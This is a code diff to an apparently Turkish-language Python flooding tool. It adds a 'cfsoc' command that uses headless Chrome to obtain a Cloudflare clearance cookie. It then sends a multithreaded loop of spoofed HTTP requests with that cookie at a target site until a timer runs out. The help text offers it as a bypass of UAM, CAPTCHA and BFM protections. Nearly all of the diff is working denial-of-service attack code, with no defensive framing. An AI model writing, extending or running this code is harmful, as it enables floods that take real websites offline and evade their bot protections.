@@ -22,8 +22,7 @@ def header():
     ╚═══╝╚══╝╚═╗║╚══╝╚╝╚╝╚══╝╚═══╝╚╝ ╚═╗╔╝╚╝ ╚╝ ╚═╝ ╚═╝╚═══╝╚══╝╚╝╚╝╚══╝
             ╔═╝║                    ╔═╝║                               
             ╚══╝                    ╚══╝                               
-
-    """)
+   """+ Fore.WHITE +" \n Komutlara Ulaşmak İçin" + Fore.RED + " 'yardim'" + Fore.WHITE + ". \n")
 
 sleep(1)
 
@@ -58,6 +57,17 @@ def komut():
     # Geliştiriciler
     elif komut == "gelistiriciler":
         gelistirici()
+    # CFSoc
+    elif komut == "cfsoc":
+        target, thread, t = bilgi_cek()
+        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypasslanıyor... (Maksimum 60s)\n")
+        if cookie_cek(target):
+            timer = threading.Thread(target=zamanlayici, args=(t,))
+            timer.start()
+            SaldiriCfSoc(target, thread, t)
+            timer.join()
+        else:
+            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypass İşlemi Başarısız!\n")
 
 
 # Komut İşlem
@@ -80,6 +90,7 @@ def clear():
 # Yardım
 def yardim():
     stdout.write("\x1b[38;2;0;236;250m╔══════════════════════════════════════════════╗\n")
+    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "cfsoc = UAM, CAPTCHA, BFM bypasslar. (socket) \n")
     stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "socket = Socket saldırısı yapar.  \n")
     stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "yardim = Komutları ve açıklamalarını gösterir.  \n")
     stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "gelistiriciler = Geliştiricileri gösterir.  \n")
@@ -150,6 +161,7 @@ def SaldiriSocket(target, until_datetime, req):
         except:
             pass
 
+# Hedef Çek
 
 def hedef_cek(url):
     url = url.rstrip()
@@ -165,6 +177,87 @@ def hedef_cek(url):
         target['port'] = "443" if urlparse(url).scheme == "https" else "80"
         pass
     return target
+
+
+# CFSoc
+
+def SaldiriCfSoc(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    target = hedef_cek(url)
+    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
+    req += 'Host: ' + target['host'] + '\r\n'
+    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
+    req += 'Accept-Encoding: gzip, deflate, br\r\n'
+    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
+    req += 'Cache-Control: max-age=0\r\n'
+    req += 'Cookie: ' + cookie + '\r\n'
+    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
+    req += 'sec-ch-ua-mobile: ?0\r\n'
+    req += 'sec-ch-ua-platform: "Windows"\r\n'
+    req += 'sec-fetch-dest: empty\r\n'
+    req += 'sec-fetch-mode: cors\r\n'
+    req += 'sec-fetch-site: same-origin\r\n'
+    req += 'Connection: Keep-Alive\r\n'
+    req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=CFSOCSaldiri,args=(until, target, req,))
+            thd.start()
+        except:  
+            pass
+
+def CFSOCSaldiri(until_datetime, target, req):
+    if target['scheme'] == 'https':
+        packet = socks.socksocket()
+        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        packet.connect((str(target['host']), int(target['port'])))
+        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
+    else:
+        packet = socks.socksocket()
+        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        packet.connect((str(target['host']), int(target['port'])))
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            for _ in range(10):
+                packet.send(str.encode(req))
+        except:
+            packet.close()
+            pass
+
+# Cookie Çek
+
+def cookie_cek(url):
+    global useragent, cookieJAR, cookie
+    options = webdriver.ChromeOptions()
+    arguments = [
+    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
+    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
+    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
+    ]
+    for argument in arguments:
+        options.add_argument(argument)
+    driver = webdriver.Chrome(options=options)
+    driver.implicitly_wait(3)
+    driver.get(url)
+    for _ in range(60):
+        cookies = driver.get_cookies()
+        tryy = 0
+        for i in cookies:
+            if i['name'] == 'cf_clearance':
+                cookieJAR = driver.get_cookies()[tryy]
+                useragent = driver.execute_script("return navigator.userAgent")
+                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
+                driver.quit()
+                return True
+            else:
+                tryy += 1
+                pass
+        time.sleep(1)
+    driver.quit()
+    return False
+
+
+# Terminal
 
 if __name__ == '__main__':
     clear()
